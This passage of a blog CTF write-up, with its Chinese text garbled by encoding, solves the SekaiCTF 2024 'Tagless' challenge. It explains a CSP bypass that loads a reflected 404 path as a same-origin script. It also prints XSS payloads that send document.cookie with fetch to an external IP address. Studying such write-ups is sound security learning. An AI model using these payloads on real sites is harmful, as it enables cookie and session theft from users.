</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">url</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid URL.&#34;</span><span class="p">},</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;http&#34;</span><span class="p">,</span> <span class="s2">&#34;https&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid scheme.&#34;</span><span class="p">},</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">hostname</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;localhost&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid host.&#34;</span><span class="p">},</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">bot</span><span class="o">.</span><span class="n">visit</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">bot</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;visited&#34;</span><span class="p">:</span> <span class="n">url</span><span class="p">},</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;URL parameter is missing!&#34;</span><span class="p">},</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> not found&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰è®¾ç½®cspé™åˆ¶ï¼Œå…ˆæ‹¿å»<a class="link" href="https://csp-evaluator.withgoogle.com/"  target="_blank" rel="noopener"
    >CSPè¯„ä¼°ç½‘ç«™</a>è¯„ä¼°ä¸€ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152113839.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215211345757"
	
	
></p>
<p>ä¸€ä¸ªobject-srcï¼Œæ§åˆ¶æ’ä»¶çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œä½†æ˜¯è¿™é‡Œç”¨ä¸äº†ã€‚ç»§ç»­å®¡ï¼Œåœ¨reportè·¯ç”±ï¼Œå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªè®©botæ¥è®¿é—®çš„æ“ä½œã€‚çœ‹ä¸€ä¸‹bot.pyæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Bot</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--headless&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-gpu&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--no-sandbox&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-dev-shm-usage&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--disable-extensions&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--window-size=1920x1080&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">visit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://127.0.0.1:5000/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">add_cookie</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;value&#34;</span><span class="p">:</span> <span class="s2">&#34;SEKAI</span><span class="si">{dummy}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;httponly&#34;</span><span class="p">:</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">refresh</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Visited </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°åœ¨å…¶ä¸­çš„visit()è®¿é—®æ—¶ï¼Œæ˜¯å¸¦ä¸Šäº†flagçš„ï¼Œå¹¶ä¸”å°†httponlyè®¾ç½®ä¸ºäº†falseï¼ŒåŒæ—¶éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä½¿ç”¨çš„Googleå¼•æ“ã€‚</p>
<p>é‚£ä¹ˆåŸºæœ¬æ€è·¯å°±æ˜¯è·å–cookieï¼Œç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œåˆ©ç”¨ã€‚</p>
<p>çœ‹ä¸€ä¸‹å‰ç«¯å¤„ç†æ¸²æŸ“çš„app.jsä»£ç ï¼Œå…¶ä¸­çœ‹åˆ°äº†ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sanitizeInput</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;\.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è´ªå©ªåŒ¹é…ï¼Œæ›¿æ¢ä¸ºç©ºï¼ŒåŸºæœ¬ä¸Šè¿‡æ»¤å®Œäº†ï¼Œä½†æ˜¯çœ‹å‡ºæ¥éƒ½æ˜¯åŒ¹é…çš„æ•´ä¸ª<code>&lt;&gt;</code>æ ‡ç­¾ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>&lt;img&gt;</code>æ ‡ç­¾æ¥è¿›è¡Œå¼•å…¥ï¼Œè®©å…¶è‡ªåŠ¨åŒ¹é…<code>&gt;</code>ï¼ˆæ³¨æ„è¿™é‡Œè¦çœ‹æ‡‚app.jsçš„æ¸²æŸ“æ‰å¥½æ‡‚ï¼‰ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152256517.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215225639352"
	
	
></p>
<p>çœ‹æ­¤æ—¶çš„å‰ç«¯ï¼Œå¯ä»¥å‘ç°åº”æ˜¯æµè§ˆå™¨è‡ªåŠ¨è¡¥è¶³äº†ç¼ºå¤±çš„<code>&lt;/body&gt;</code>æ ‡ç­¾ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152257544.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215225736494"
	
	
></p>
<p>ä½†æ˜¯æš‚æ—¶åˆ©ç”¨ä¸äº†ï¼Œç»§ç»­çœ‹ã€‚æ³¨æ„çœ‹app.pyæ–‡ä»¶ä¸­çš„404å¤„ç†è¿‡ç¨‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> not found&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¤„ç†404é¡µé¢æ—¶ï¼Œä¼šç›´æ¥åœ¨å°†è·¯å¾„æ‰“å°åœ¨é¡µé¢ä¸Šï¼Ÿ</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152140130.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215214036075"
	
	
></p>
<p>ç¡®å®ä¼šï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå°±å¯ä»¥æ’å…¥ä»»æ„çš„jsæ ‡ç­¾ï¼Œæ¯”å¦‚ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152144535.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215214455486"
	
	
></p>
<p>ç¡®å®è§£æäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œjsè§£æã€‚æ­¤æ—¶çœ‹åˆ°æ§åˆ¶å°æŠ¥é”™ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152324061.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215232412993"
	
	
></p>
<p>è¿™ä¸ªæ˜¯è¢«CSPé™åˆ¶äº†ï¼Œè¿™é‡Œæ‰æ³¨æ„åˆ°æºä»£ç ä¸­çš„CSPçš„è®¾ç½®æ˜¯å…¨éƒ¨è·¯ç”±ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_security_headers</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;script-src &#39;self&#39;; style-src &#39;self&#39; https://fonts.googleapis.com https://unpkg.com &#39;unsafe-inline&#39;; font-src https://fonts.gstatic.com;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‰é¢å¿˜äº†ï¼Œä»¥ä¸ºæ˜¯åªæœ‰indexæ‰èƒ½ã€‚</p>
<p>æ‰€ä»¥éœ€è¦ç»•ä¸€ä¸‹è¿™ä¸ªcspï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œè¿™é‡Œçš„ç»•è¿‡æ–¹æ³•éå¸¸ç²¾å¦™å‘€ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>&lt;script&gt;</code>æ ‡ç­¾çš„srcå±æ€§ï¼Œå½“æˆ‘ä»¬æŒ‡å®šsrcåï¼Œå¼•å…¥jsæ–‡ä»¶æ—¶å°±ä¼šæ‹¼æ¥ä¸Šè·¯å¾„ç„¶åè®¿é—®ï¼Œæ¯”å¦‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/1.js&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¼•å…¥çš„æ–‡ä»¶æ—¶å‘é€çš„è¯·æ±‚æ˜¯<code>http://hostname/1.js</code>ï¼Œå‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/festone000/article/details/112030241 ã€‚</p>
<p>é‚£ä¹ˆåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±é¢å¯ä»¥å°è¯•æ¥æ„é€ ä¸€ä¸‹404é¡µé¢ï¼Œä»è€Œæ¥ç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰è„æ•°æ®ï¼Œæ¯”å¦‚æˆ‘ä»¬æŒ‡å®šè®¿é—®<code>/alert(1)</code>æ–‡ä»¶ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„â€œæ–‡ä»¶â€å†…å®¹ä¸ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152340598.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215234007543"
	
	
></p>
<p>æƒ³è¦è¿™é‡Œçš„ä»£ç æ­£ç¡®ï¼Œéœ€è¦ç»•ä¸€ä¸‹ã€‚æ¯”å¦‚å‰é¢çš„<code>/</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ ä¸€ä¸ª<code>**/</code>æ¥æ„é€ å¤šè¡Œæ³¨é‡Šçš„æ•ˆæœï¼Œç„¶ååé¢çš„å°±ä½¿ç”¨<code>//</code>æ¥å•è¡Œæ³¨é‡Šæ‰å³å¯ï¼Œæœ€åæˆåŠŸå¼¹çª—ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152343430.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215234308349"
	
	
></p>
<p>å“‡ï¼ŒåŸæ¥srcå¼•å…¥çš„jsæ–‡ä»¶ï¼Œå¦‚æœæ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œé‚£ä¹ˆåŒæ ·æ˜¯æ‹¼æ¥åˆ°urlä¸Šå»è®¿é—®è·å–å†…å®¹çš„ï¼Œæœ‰æ„æ€æœ‰æ„æ€ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°è¯•è·å–cookieï¼Œæ— httponlyï¼Œç›´æ¥å¤–å¸¦ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">%</span><span class="mi">20</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/**/fetch(`http://47.100.223.173:2333?cookie=${document.cookie}`)//&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œedgeã€firefoxå’Œgoogleéƒ½èƒ½è§£æï¼Œä½†æ˜¯å°±æ˜¯æ‰“ä¸é€šåªèƒ½æ”¹payloadäº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/**/fetch(&#39;http://47.100.223.173:2333/&#39;+document.cookie)//&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¼ å‚ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502160110903.png"
	
	
	
	loading="lazy"
	
		alt="image-20250216011047819"
	
	
></p>
<p>è¿™ä¸ªå°±æ‰“å‡ºæ¥äº†ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502160110795.png"
	
	
	
	loading="lazy"
	
		alt="image-20250216011011337"
	
	
></p>
<p>æœäº†ï¼Œåˆåœ¨è¿™ä¸ªç»†èŠ‚ç‚¹å¡äº†å¾ˆä¹…ã€‚</p>
<h4 id="display">display
</h4><p>N1CTF Junior 2025çš„é¢˜ï¼Œå…·ä½“çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š</p>
<p><a class="link" href="https://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display"  target="_blank" rel="noopener"
    >https://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display</a></p>
<p>å‚è€ƒwpï¼š</p>
<p><a class="link" href="https://hackmd.io/@Whale120/HJ_rpvujC"  target="_blank" rel="noopener"
    >https://hackmd.io/@Whale120/HJ_rpvujC</a></p>
<p><a class="link" href="https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/"  target="_blank" rel="noopener"
    >https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/</a></p>
<p><a class="link" href="https://www.justus.pw/writeups/sekai-ctf/tagless.html"  target="_blank" rel="noopener"
    >https://www.justus.pw/writeups/sekai-ctf/tagless.html</a></p>
<p>çŸ¥è¯†ç‚¹å‚è€ƒæ–‡ç« ï¼š</p>
<p><a class="link" href="https://www.cnblogs.com/kinyoobi/p/15341248.html"  target="_blank" rel="noopener"
    >https://www.cnblogs.com/kinyoobi/p/15341248.html</a></p>
<p><a class="link" href="https://juejin.cn/post/7426954121309356042#heading-5"  target="_blank" rel="noopener"
    >https://juejin.cn/post/7426954121309356042#heading-5</a></p>
<p><a class="link" href="https://xz.aliyun.com/news/4716"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/4716</a></p>
<p><a class="link" href="https://xz.aliyun.com/news/6968"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/6968</a></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">ThinkPHPæ¼æ´å¤ç°</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
        
        

        <div class="article-details">
            <h2 class="article-title">phpstormè¿œç¨‹è°ƒè¯•ç¯å¢ƒæ­å»º</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
